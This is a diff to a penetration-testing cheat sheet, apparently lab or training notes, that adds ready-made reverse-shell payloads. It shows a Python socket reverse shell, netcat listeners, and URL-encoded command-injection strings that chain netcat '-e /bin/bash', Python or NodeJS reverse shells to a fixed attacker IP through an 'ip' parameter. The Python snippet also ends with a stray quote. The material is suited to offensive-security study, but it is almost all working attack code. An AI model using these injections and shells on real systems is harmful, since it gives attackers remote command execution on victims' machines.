@@ -231,6 +231,8 @@ wfuzz -c -z file,/home/kali/capability_checks.txt --hc 404 "http://ci-sandbox:80
 
 ### Obtaining a Shell - Netcat
 
+#### netcat
+
 ```shell
 nc -nlvp 9090
 ```
@@ -239,6 +241,41 @@ nc -nlvp 9090
 http://target:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
 ```
 
+#### Python
+
+```python
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.49.51",9090))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+```shell
+nc -nlvp 9090
+```
+
+```shell
+http://target/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+```
+
+#### NodeJS
+
+
+```shell
+http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
+```
+
+```shell
+http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
+```
+
+#### PHP
 
 
 # 🔄 Alternatives to `base64` Binary (Encode/Decode)
